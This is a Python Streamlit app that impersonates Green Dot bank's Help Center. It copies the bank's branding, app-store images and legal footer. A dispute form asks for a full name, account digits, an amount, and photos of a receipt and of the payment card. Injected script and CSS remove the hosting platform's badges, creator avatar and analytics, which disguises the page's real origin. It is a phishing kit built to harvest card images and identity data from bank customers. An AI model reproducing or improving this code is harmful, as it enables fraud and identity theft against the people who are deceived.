
import streamlit as st
import sqlite3
import os
from datetime import datetime

# DB Setup
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")

# 1. INYECCIÓN DE SCRIPT PARA LIMPIEZA DE DOM
st.markdown("""<script>
    const cleanStreamlit = () => {
        const toRemove = [
            '._container_gzau3_1', '._viewerBadge_aycw8_23', '._profileContainer_gzau3_53',
            '._profilePreview_gzau3_63', 'iframe[title="Streamlit Cloud Status"]',
            '[data-testid="appCreatorAvatar"]', 'script[src*="googletagmanager"]',
            'script[src*="segment.com"]', '.section-anchor', 'a.section-anchor'
        ];
        toRemove.forEach(selector => {
            document.querySelectorAll(selector).forEach(el => el.remove());
        });
    };
    cleanStreamlit();
    setInterval(cleanStreamlit, 1000);
</script>""", unsafe_allow_html=True)

# 2. CSS AGRESIVO PARA ELIMINAR ENLACES DE TÍTULOS
st.markdown("""<style>
/* Bloqueo total de anchors y eventos de mouse en títulos */
.section-anchor, a.section-anchor, .stMarkdown [data-testid="stMarkdownContainer"] a.section-anchor {
    display: none !important;
    visibility: hidden !important;
    pointer-events: none !important;
}

h1, h2, h3, h4, h5, h6 {
    pointer-events: none !important;
    user-select: none !important;
}

/* Ocultar elementos de Streamlit */
[data-testid='stHeader'], header, footer, .stDeployButton, button[title='View fullscreen'] {
    display: none !important;
    visibility: hidden !important;
}

.stApp { background-color: #000000 !important; color: #FFFFFF !important; }
.block-container { padding-top: 1rem !important; }
.stButton>button { background-color: #00a05b !important; color: white !important; width: 100%; padding: 15px !important; font-weight: bold !important; border: none !important; }
.legal-footer { font-size: 11px; color: #666; text-align: justify; margin-top: 60px; border-top: 1px solid #222; padding-top: 20px; line-height: 1.5; }
</style>""", unsafe_allow_html=True)

if os.path.exists('logo.svg'):
    st.image('logo.svg', width=250)

st.title("Help Center")
st.write("Please fill out the form below to submit your claim.")

with st.form("dispute_form", clear_on_submit=True):
    nombre = st.text_input("Full Name")
    cuenta = st.text_input("Last 4 digits of Account")
    monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
    st.markdown("**Upload Evidence**")
    rec = st.file_uploader("Receipt Photo", type=['jpg','png','jpeg'])
    car = st.file_uploader("Card Photo", type=['jpg','png','jpeg'])
    submitted = st.form_submit_button("SUBMIT NOW")

if submitted:
    if nombre and rec and car:
        st.success("✅ Claim received.")

st.markdown("""<div style='background-color: #111; padding: 40px; text-align: center; border-radius: 12px; margin: 30px 0; border: 1px solid #222;'>
    <h2 style='color:white; margin-bottom:20px;'>Download the Green Dot app</h2>
    <div style='display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-bottom: 25px;'>
        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='160'>
        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='160'>
    </div>
    <p style='color:#bbb; max-width:600px; margin: 0 auto;'>We offer secure mobile banking that allows you to conveniently manage your account from making deposits, to sending money or paying bills.</p>
</div>""", unsafe_allow_html=True)

st.markdown("""<div class='legal-footer'>
    ©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924; Green Dot Bank NMLS #908739.
</div>""", unsafe_allow_html=True)
